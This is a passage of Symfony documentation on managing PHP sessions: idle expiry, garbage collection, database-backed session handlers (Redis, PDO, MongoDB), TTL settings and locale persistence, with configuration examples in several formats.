Session Idle Time/Keep Alive
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

There are often circumstances where you may want to protect, or minimize
unauthorized use of a session when a user steps away from their terminal while
logged in by destroying the session after a certain period of idle time. For
example, it is common for banking applications to log the user out after just
5 to 10 minutes of inactivity. Setting the cookie lifetime here is not
appropriate because that can be manipulated by the client, so we must do the expiry
on the server side. The easiest way is to implement this via :ref:`session garbage collection <session-garbage-collection>`
which runs reasonably frequently. The ``cookie_lifetime`` would be set to a
relatively high value, and the garbage collection ``gc_maxlifetime`` would be set
to destroy sessions at whatever the desired idle period is.

The other option is specifically check if a session has expired after the
session is started. The session can be destroyed as required. This method of
processing can allow the expiry of sessions to be integrated into the user
experience, for example, by displaying a message.

Symfony records some metadata about each session to give you fine control over
the security settings::

    $session->getMetadataBag()->getCreated();
    $session->getMetadataBag()->getLastUsed();

Both methods return a Unix timestamp (relative to the server).

This metadata can be used to explicitly expire a session on access::

    $session->start();
    if (time() - $session->getMetadataBag()->getLastUsed() > $maxIdleTime) {
        $session->invalidate();
        throw new SessionExpired(); // redirect to expired session page
    }

It is also possible to tell what the ``cookie_lifetime`` was set to for a
particular cookie by reading the ``getLifetime()`` method::

    $session->getMetadataBag()->getLifetime();

The expiry time of the cookie can be determined by adding the created
timestamp and the lifetime.

.. _session-garbage-collection:

Configuring Garbage Collection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a session opens, PHP will call the ``gc`` handler randomly according to the
probability set by ``session.gc_probability`` / ``session.gc_divisor``. For
example if these were set to ``5/100`` respectively, it would mean a probability
of 5%. Similarly, ``3/4`` would mean a 3 in 4 chance of being called, i.e. 75%.

If the garbage collection handler is invoked, PHP will pass the value stored in
the ``php.ini`` directive ``session.gc_maxlifetime``. The meaning in this context is
that any stored session that was saved more than ``gc_maxlifetime`` ago should be
deleted. This allows one to expire records based on idle time.

However, some operating systems (e.g. Debian) do their own session handling and set
the ``session.gc_probability`` variable to ``0`` to stop PHP doing garbage
collection. That's why Symfony now overwrites this value to ``1``.

If you wish to use the original value set in your ``php.ini``, add the following
configuration:

.. code-block:: yaml

    # config/packages/framework.yaml
    framework:
        session:
            # ...
            gc_probability: null

You can configure these settings by passing ``gc_probability``, ``gc_divisor``
and ``gc_maxlifetime`` in an array to the constructor of
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\NativeSessionStorage`
or to the :method:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\NativeSessionStorage::setOptions`
method.

.. _session-database:

Store Sessions in a Database
----------------------------

Symfony stores sessions in files by default. If your application is served by
multiple servers, you'll need to use a database instead to make sessions work
across different servers.

Symfony can store sessions in all kinds of databases (relational, NoSQL and
key-value) but recommends key-value databases like Redis to get best
performance.

Store Sessions in a key-value Database (Redis)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This section assumes that you have a fully-working Redis server and have also
installed and configured the `phpredis extension`_.

You have two different options to use Redis to store sessions:

The first PHP-based option is to configure Redis session handler directly
in the server ``php.ini`` file:

.. code-block:: ini

    ; php.ini
    session.save_handler = redis
    session.save_path = "tcp://192.168.0.178:6379?auth=REDIS_PASSWORD"

The second option is to configure Redis sessions in Symfony. First, define
a Symfony service for the connection to the Redis server:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...
            Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler:
                arguments:
                    - '@Redis'
                    # you can optionally pass an array of options. The only options are 'prefix' and 'ttl',
                    # which define the prefix to use for the keys to avoid collision on the Redis server
                    # and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:
                    # - { 'prefix': 'my_prefix', 'ttl': 600 }

            Redis:
                # you can also use \RedisArray, \RedisCluster, \Relay\Relay or \Predis\Client classes
                class: \Redis
                calls:
                    - connect:
                        - '%env(REDIS_HOST)%'
                        - '%env(int:REDIS_PORT)%'

                    # uncomment the following if your Redis server requires a password
                    # - auth:
                    #     - '%env(REDIS_PASSWORD)%'

                    # uncomment the following if your Redis server requires a user and a password (when user is not default)
                    # - auth:
                    #     - ['%env(REDIS_USER)%','%env(REDIS_PASSWORD)%']

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- you can also use \RedisArray, \RedisCluster, \Relay\Relay or \Predis\Client classes -->
                <service id="Redis" class="Redis">
                    <call method="connect">
                        <argument>%env(REDIS_HOST)%</argument>
                        <argument>%env(int:REDIS_PORT)%</argument>
                    </call>

                    <!-- uncomment the following if your Redis server requires a password:
                    <call method="auth">
                        <argument>%env(REDIS_PASSWORD)%</argument>
                    </call> -->

                    <!-- uncomment the following if your Redis server requires a user and a password (when user is not default):
                    <call method="auth">
                        <argument>%env(REDIS_USER)%</argument>
                        <argument>%env(REDIS_PASSWORD)%</argument>
                    </call> -->
                </service>

                <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler">
                    <argument type="service" id="Redis"/>
                    <!-- you can optionally pass an array of options. The only options are 'prefix' and 'ttl',
                         which define the prefix to use for the keys to avoid collision on the Redis server
                         and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:
                    <argument type="collection">
                        <argument key="prefix">my_prefix</argument>
                        <argument key="ttl">600</argument>
                    </argument> -->
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\DependencyInjection\Reference;
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler;

        $container
            // you can also use \RedisArray, \RedisCluster, \Relay\Relay or \Predis\Client classes
            ->register('Redis', \Redis::class)
            ->addMethodCall('connect', ['%env(REDIS_HOST)%', '%env(int:REDIS_PORT)%'])
            // uncomment the following if your Redis server requires a password:
            // ->addMethodCall('auth', ['%env(REDIS_PASSWORD)%'])
            // uncomment the following if your Redis server requires a user and a password (when user is not default):
            // ->addMethodCall('auth', ['%env(REDIS_USER)%', '%env(REDIS_PASSWORD)%'])

            ->register(RedisSessionHandler::class)
            ->addArgument(
                new Reference('Redis'),
                // you can optionally pass an array of options. The only options are 'prefix' and 'ttl',
                // which define the prefix to use for the keys to avoid collision on the Redis server
                // and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:
                // ['prefix' => 'my_prefix', 'ttl' => 600],
            )
        ;

Next, use the :ref:`handler_id <config-framework-session-handler-id>`
configuration option to tell Symfony to use this service as the session handler:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            session:
                handler_id: Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- ... -->
                <framework:session handler-id="Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->session()
                ->handlerId(RedisSessionHandler::class)
            ;
        };

Symfony will now use your Redis server to read and write the session data. The
main drawback of this solution is that Redis does not perform session locking,
so you can face *race conditions* when accessing sessions. For example, you may
see an *"Invalid CSRF token"* error because two requests were made in parallel
and only the first one stored the CSRF token in the session.

.. seealso::

    If you use Memcached instead of Redis, follow a similar approach but
    replace ``RedisSessionHandler`` by
    :class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MemcachedSessionHandler`.

.. tip::

    When using Redis with a DSN in the
    :ref:`handler_id <config-framework-session-handler-id>` config option, you can
    add the ``prefix`` and ``ttl`` options as query string parameters in the DSN.

.. _session-database-pdo:

Store Sessions in a Relational Database (MariaDB, MySQL, PostgreSQL)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony includes a
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler`
to store sessions in relational databases like MariaDB, MySQL and PostgreSQL.
To use it, first register a new handler service with your database credentials:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler:
                arguments:
                    - '%env(DATABASE_URL)%'

                    # you can also use PDO configuration, but requires passing two arguments
                    # - 'mysql:dbname=mydatabase; host=myhost; port=myport'
                    # - { db_username: myuser, db_password: mypassword }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <services>
                <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler">
                    <argument>%env(DATABASE_URL)%</argument>

                    <!-- you can also use PDO configuration, but requires passing two arguments: -->
                    <!-- <argument>mysql:dbname=mydatabase; host=myhost; port=myport</argument>
                        <argument type="collection">
                            <argument key="db_username">myuser</argument>
                            <argument key="db_password">mypassword</argument>
                        </argument> -->
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(PdoSessionHandler::class)
                ->args([
                    env('DATABASE_URL'),
                    // you can also use PDO configuration, but requires passing two arguments:
                    // 'mysql:dbname=mydatabase; host=myhost; port=myport',
                    // ['db_username' => 'myuser', 'db_password' => 'mypassword'],
                ])
            ;
        };

.. tip::

    When using MySQL as the database, the DSN defined in ``DATABASE_URL`` can
    contain the ``charset`` and ``unix_socket`` options as query string parameters.

Next, use the :ref:`handler_id <config-framework-session-handler-id>`
configuration option to tell Symfony to use this service as the session handler:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                # ...
                handler_id: Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- ... -->
                <framework:session
                    handler-id="Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->session()
                ->handlerId(PdoSessionHandler::class)
            ;
        };

Configuring the Session Table and Column Names
..............................................

The table used to store sessions is called ``sessions`` by default and defines
certain column names. You can configure these values with the second argument
passed to the ``PdoSessionHandler`` service:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler:
                arguments:
                    - '%env(DATABASE_URL)%'
                    - { db_table: 'customer_session', db_id_col: 'guid' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler">
                    <argument>%env(DATABASE_URL)%</argument>
                    <argument type="collection">
                        <argument key="db_table">customer_session</argument>
                        <argument key="db_id_col">guid</argument>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\HttpFoundation\Session\Storage\Handler\PdoSessionHandler;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(PdoSessionHandler::class)
                ->args([
                    env('DATABASE_URL'),
                    ['db_table' => 'customer_session', 'db_id_col' => 'guid'],
                ])
            ;
        };

These are parameters that you can configure:

``db_table`` (default ``sessions``):
    The name of the session table in your database;

``db_username``: (default: ``''``)
    The username used to connect when using the PDO configuration (when using
    the connection based on the ``DATABASE_URL`` env var, it overrides the
    username defined in the env var).

``db_password``: (default: ``''``)
    The password used to connect when using the PDO configuration (when using
    the connection based on the ``DATABASE_URL`` env var, it overrides the
    password defined in the env var).

``db_id_col`` (default ``sess_id``):
    The name of the column where to store the session ID (column type: ``VARCHAR(128)``);

``db_data_col`` (default ``sess_data``):
    The name of the column where to store the session data (column type: ``BLOB``);

``db_time_col`` (default ``sess_time``):
    The name of the column where to store the session creation timestamp (column type: ``INTEGER``);

``db_lifetime_col`` (default ``sess_lifetime``):
    The name of the column where to store the session lifetime (column type: ``INTEGER``);

``db_connection_options`` (default: ``[]``)
    An array of driver-specific connection options;

``lock_mode`` (default: ``LOCK_TRANSACTIONAL``)
    The strategy for locking the database to avoid *race conditions*. Possible
    values are ``LOCK_NONE`` (no locking), ``LOCK_ADVISORY`` (application-level
    locking) and ``LOCK_TRANSACTIONAL`` (row-level locking).

Preparing the Database to Store Sessions
........................................

Before storing sessions in the database, you must create the table that stores
the information.

With Doctrine installed, the session table will be automatically generated when
you run the ``make:migration`` command if the database targeted by doctrine is
identical to the one used by this component.

Or if you prefer to create the table yourself and the table has not already been
created, the session handler provides a method called
:method:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler::createTable`
to set up this table for you according to the database engine used::

    try {
        $sessionHandlerService->createTable();
    } catch (\PDOException $exception) {
        // the table could not be created for some reason
    }

If the table already exists an exception will be thrown.

If you would rather set up the table yourself, it's recommended to generate an
empty database migration with the following command:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:generate

Then, find the appropriate SQL for your database below, add it to the migration
file and run the migration with the following command:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:migrate

If needed, you can also add this table to your schema by calling
:method:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler::configureSchema`
method in your code.

.. _mysql:

MariaDB/MySQL
+++++++++++++

.. code-block:: sql

    CREATE TABLE `sessions` (
        `sess_id` VARBINARY(128) NOT NULL PRIMARY KEY,
        `sess_data` BLOB NOT NULL,
        `sess_lifetime` INTEGER UNSIGNED NOT NULL,
        `sess_time` INTEGER UNSIGNED NOT NULL,
        INDEX `sessions_sess_lifetime_idx` (`sess_lifetime`)
    ) COLLATE utf8mb4_bin, ENGINE = InnoDB;

.. note::

    A ``BLOB`` column type (which is the one used by default by ``createTable()``)
    stores up to 64 kb. If the user session data exceeds this, an exception may
    be thrown or their session will be silently reset. Consider using a ``MEDIUMBLOB``
    if you need more space.

PostgreSQL
++++++++++

.. code-block:: sql

    CREATE TABLE sessions (
        sess_id VARCHAR(128) NOT NULL PRIMARY KEY,
        sess_data BYTEA NOT NULL,
        sess_lifetime INTEGER NOT NULL,
        sess_time INTEGER NOT NULL
    );
    CREATE INDEX sessions_sess_lifetime_idx ON sessions (sess_lifetime);

Microsoft SQL Server
++++++++++++++++++++

.. code-block:: sql

    CREATE TABLE sessions (
        sess_id VARCHAR(128) NOT NULL PRIMARY KEY,
        sess_data NVARCHAR(MAX) NOT NULL,
        sess_lifetime INTEGER NOT NULL,
        sess_time INTEGER NOT NULL,
        INDEX sessions_sess_lifetime_idx (sess_lifetime)
    );

.. _session-database-mongodb:

Store Sessions in a NoSQL Database (MongoDB)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony includes a
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler`
to store sessions in the MongoDB NoSQL database. First, make sure to have a
working MongoDB connection in your Symfony application as explained in the
`DoctrineMongoDBBundle configuration`_ article.

Then, register a new handler service for ``MongoDbSessionHandler`` and pass it
the MongoDB connection as argument, and the required parameters:

``database``:
    The name of the database

``collection``:
    The name of the collection

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler:
                arguments:
                    - '@doctrine_mongodb.odm.default_connection'
                    - { database: '%env(MONGODB_DB)%', collection: 'sessions' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <services>
                <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler">
                    <argument type="service">doctrine_mongodb.odm.default_connection</argument>
                    <argument type="collection">
                        <argument key="database">%env('MONGODB_DB')%</argument>
                        <argument key="collection">sessions</argument>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(MongoDbSessionHandler::class)
                ->args([
                    service('doctrine_mongodb.odm.default_connection'),
                    ['database' => '%env("MONGODB_DB")%', 'collection' => 'sessions']
                ])
            ;
        };

Next, use the :ref:`handler_id <config-framework-session-handler-id>`
configuration option to tell Symfony to use this service as the session handler:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                # ...
                handler_id: Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- ... -->
                <framework:session
                    handler-id="Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->session()
                ->handlerId(MongoDbSessionHandler::class)
            ;
        };

That's all! Symfony will now use your MongoDB server to read and write the
session data. You do not need to do anything to initialize your session
collection. However, you may want to add an index to improve garbage collection
performance. Run this from the `MongoDB shell`_:

.. code-block:: javascript

    use session_db
    db.session.createIndex( { "expires_at": 1 }, { expireAfterSeconds: 0 } )

Configuring the Session Field Names
...................................

The collection used to store sessions defines certain field names. You can
configure these values with the second argument passed to the
``MongoDbSessionHandler`` service:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler:
                arguments:
                    - '@doctrine_mongodb.odm.default_connection'
                    -
                        database: '%env(MONGODB_DB)%'
                        collection: 'sessions'
                        id_field: '_guid'
                        expiry_field: 'eol'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler">
                    <argument type="service">doctrine_mongodb.odm.default_connection</argument>
                    <argument type="collection">
                        <argument key="database">%env('MONGODB_DB')%</argument>
                        <argument key="collection">sessions</argument>
                        <argument key="id_field">_guid</argument>
                        <argument key="expiry_field">eol</argument>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\HttpFoundation\Session\Storage\Handler\MongoDbSessionHandler;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(MongoDbSessionHandler::class)
                ->args([
                    service('doctrine_mongodb.odm.default_connection'),
                    [
                        'database' => '%env('MONGODB_DB')%',
                        'collection' => 'sessions'
                        'id_field' => '_guid',
                        'expiry_field' => 'eol',
                    ],
                ])
            ;
        };

These are parameters that you can configure:

``id_field`` (default ``_id``):
    The name of the field where to store the session ID;

``data_field`` (default ``data``):
    The name of the field where to store the session data;

``time_field`` (default ``time``):
    The name of the field where to store the session creation timestamp;

``expiry_field`` (default ``expires_at``):
    The name of the field where to store the session lifetime.

Migrating Between Session Handlers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your application changes the way sessions are stored, use the
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MigratingSessionHandler`
to migrate between old and new save handlers without losing session data.

This is the recommended migration workflow:

#. Switch to the migrating handler, with your new handler as the write-only one.
   The old handler behaves as usual and sessions get written to the new one::

       $sessionStorage = new MigratingSessionHandler($oldSessionStorage, $newSessionStorage);

#. After your session gc period, verify that the data in the new handler is correct.
#. Update the migrating handler to use the old handler as the write-only one, so
   the sessions will now be read from the new handler. This step allows easier rollbacks::

       $sessionStorage = new MigratingSessionHandler($newSessionStorage, $oldSessionStorage);

#. After verifying that the sessions in your application are working, switch
   from the migrating handler to the new handler.

.. _session-configure-ttl:

Configuring the Session TTL
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony by default will use PHP's ini setting ``session.gc_maxlifetime`` as
session lifetime. When you store sessions in a database, you can also
configure your own TTL in the framework configuration or even at runtime.

.. note::

    Changing the ini setting is not possible once the session is started so
    if you want to use a different TTL depending on which user is logged
    in, you must do it at runtime using the callback method below.

Configure the TTL
.................

You need to pass the TTL in the options array of the session handler you are using:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...
            Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler:
                arguments:
                    - '@Redis'
                    - { 'ttl': 600 }

    .. code-block:: xml

        <!-- config/services.xml -->
        <services>
            <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler">
                <argument type="service" id="Redis"/>
                <argument type="collection">
                    <argument key="ttl">600</argument>
                </argument>
            </service>
        </services>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler;

        $services
            ->set(RedisSessionHandler::class)
            ->args([
                service('Redis'),
                ['ttl' => 600],
            ]);

Configure the TTL Dynamically at Runtime
........................................

If you would like to have a different TTL for different users or sessions
for whatever reason, this is also possible by passing a callback as the TTL
value. The callback will be called right before the session is written and
has to return an integer which will be used as TTL.

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...
            Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler:
                arguments:
                    - '@Redis'
                    - { 'ttl': !closure '@my.ttl.handler' }

            my.ttl.handler:
                class: Some\InvokableClass # some class with an __invoke() method
                arguments:
                    # Inject whatever dependencies you need to be able to resolve a TTL for the current session
                    - '@security'

    .. code-block:: xml

        <!-- config/services.xml -->
        <services>
            <service id="Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler">
                <argument type="service" id="Redis"/>
                <argument type="collection">
                    <argument key="ttl" type="closure" id="my.ttl.handler"/>
                </argument>
            </service>
            <!-- some class with an __invoke() method -->
            <service id="my.ttl.handler" class="Some\InvokableClass">
                <!-- Inject whatever dependencies you need to be able to resolve a TTL for the current session -->
                <argument type="service" id="security"/>
            </service>
        </services>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\RedisSessionHandler;

        $services
            ->set(RedisSessionHandler::class)
            ->args([
                service('Redis'),
                ['ttl' => closure(service('my.ttl.handler'))],
            ]);

        $services
            // some class with an __invoke() method
            ->set('my.ttl.handler', 'Some\InvokableClass')
            // Inject whatever dependencies you need to be able to resolve a TTL for the current session
            ->args([service('security')]);

.. _locale-sticky-session:

Making the Locale "Sticky" during a User's Session
--------------------------------------------------

Symfony stores the locale setting in the Request, which means that this setting
is not automatically saved ("sticky") across requests. But, you *can* store the
locale in the session, so that it's used on subsequent requests.

Creating a LocaleSubscriber
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Create a :ref:`new event subscriber <events-subscriber>`. Typically,
``_locale`` is used as a routing parameter to signify the locale, though you
can determine the correct locale however you want::

    // src/EventSubscriber/LocaleSubscriber.php
    namespace App\EventSubscriber;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\RequestEvent;
    use Symfony\Component\HttpKernel\KernelEvents;

    class LocaleSubscriber implements EventSubscriberInterface
    {
        public function __construct(
            private string $defaultLocale = 'en',
        ) {
        }

        public function onKernelRequest(RequestEvent $event): void
        {
            $request = $event->getRequest();
            if (!$request->hasPreviousSession()) {
                return;
            }

            // try to see if the locale has been set as a _locale routing parameter
            if ($locale = $request->attributes->get('_locale')) {
                $request->getSession()->set('_locale', $locale);
            } else {
                // if no explicit locale has been set on this request, use one from the session
                $request->setLocale($request->getSession()->get('_locale', $this->defaultLocale));
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                // must be registered before (i.e. with a higher priority than) the default Locale listener
                KernelEvents::REQUEST => [['onKernelRequest', 20]],
            ];
        }
    }

If you're using the :ref:`default services.yaml configuration
<service-container-services-load-example>`, you're done! Symfony will
automatically know about the event subscriber and call the ``onKernelRequest``
method on each request.

To see it working, either set the ``_locale`` key on the session manually (e.g.
via some "Change Locale" route & controller), or create a route with the
:ref:`_locale default <translation-locale-url>`.

.. sidebar:: Explicitly Configure the Subscriber

    You can also explicitly configure it, in order to pass in the
    :ref:`default_locale <config-framework-default_locale>`:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                # ...

                App\EventSubscriber\LocaleSubscriber:
                    arguments: ['%kernel.default_locale%']
                    # uncomment the next line if you are not using autoconfigure
                    # tags: [kernel.event_subscriber]

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <services>
                    <service id="App\EventSubscriber\LocaleSubscriber">
                        <argument>%kernel.default_locale%</argument>

                        <!-- uncomment the next line if you are not using autoconfigure -->
                        <!-- <tag name="kernel.event_subscriber"/> -->
                    </service>
                </services>
            </container>

        .. code-block:: php

            // config/services.php
            use App\EventSubscriber\LocaleSubscriber;

            $container->register(LocaleSubscriber::class)
                ->addArgument('%kernel.default_locale%')
                // uncomment the next line if you are not using autoconfigure
                // ->addTag('kernel.event_subscriber')
            ;

Now celebrate by changing the user's locale and seeing that it's sticky
throughout the request.

Remember, to get the user's locale, always use the :method:`Request::getLocale
<Symfony\\Component\\HttpFoundation\\Request::getLocale>` method::

    // from a controller...
    use Symfony\Component\HttpFoundation\Request;

    public function index(Request $request): void
    {
        $locale = $request->getLocale();
    }

Setting the Locale Based on the User's Preferences
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You might want to improve this technique even further and define the locale
based on the user entity of the logged in user. However, since the
``LocaleSubscriber`` is called before the ``FirewallListener``, which is
responsible for handling authentication and setting the user token on the
``TokenStorage``, you have no access to the user which is logged in.

Suppose you have a ``locale`` property on your ``User`` entity and want to use
this as the locale for the given user. To accomplish this, you can hook into
the login process and update the user's session with this locale value before
they are redirected to their first page.

To do this, you need an event subscriber on the ``LoginSuccessEvent::class``
event::

    // src/EventSubscriber/UserLocaleSubscriber.php
    namespace App\EventSubscriber;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\Security\Http\Event\LoginSuccessEvent;

    /**
     * Stores the locale of the user in the session after the
     * login. This can be used by the LocaleSubscriber afterwards.
     */
    class UserLocaleSubscriber implements EventSubscriberInterface
    {
        public function __construct(
